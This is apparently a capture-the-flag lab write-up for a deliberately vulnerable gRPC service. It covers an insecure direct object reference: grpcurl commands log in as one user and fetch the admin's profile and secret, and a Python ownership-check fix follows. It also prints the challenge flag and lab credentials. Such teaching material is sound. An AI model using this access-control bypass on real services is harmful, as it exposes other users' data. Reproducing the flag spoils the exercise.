# Challenge 05 — IDOR (Insecure Direct Object Reference)

**Category:** Broken Access Control
**Difficulty:** 🟢 Easy
**Service:** `UserService`
**Flag:** `FLAG{1ns3cur3_d1r3ct_0bj3ct_r3f3r3nc3}`

---

## Background

IDOR occurs when a server exposes internal object identifiers (user IDs, note IDs) and uses them to fetch data **without verifying the caller has access**. The attacker simply substitutes their own ID with another user's ID.

In DVGRPC, `UserService.GetProfile(user_id=...)` fetches any user's profile including their `secret` field. `user_id=1` is always the admin, whose `secret` contains the flag.

---

## Steps

```bash
# Login as alice
grpcurl -plaintext localhost:50051 dvgrpc.AuthService/Login \
  -d '{"username":"alice","password":"alice123"}'

# Use alice's token to access admin's profile (user_id=1)
grpcurl -plaintext \
  -H "Authorization: Bearer <alice_token>" \
  localhost:50051 dvgrpc.UserService/GetProfile \
  -d '{"user_id":1}'

# Flag is in the 'secret' field of the response
```

---

## Fix

```python
# Verify ownership before returning data
def GetProfile(self, request, context):
    caller = _get_caller(context)
    if caller["user_id"] != request.user_id and caller["role"] != "admin":
        context.abort(grpc.StatusCode.PERMISSION_DENIED, "Access denied.")
        return
    # fetch and return profile
```
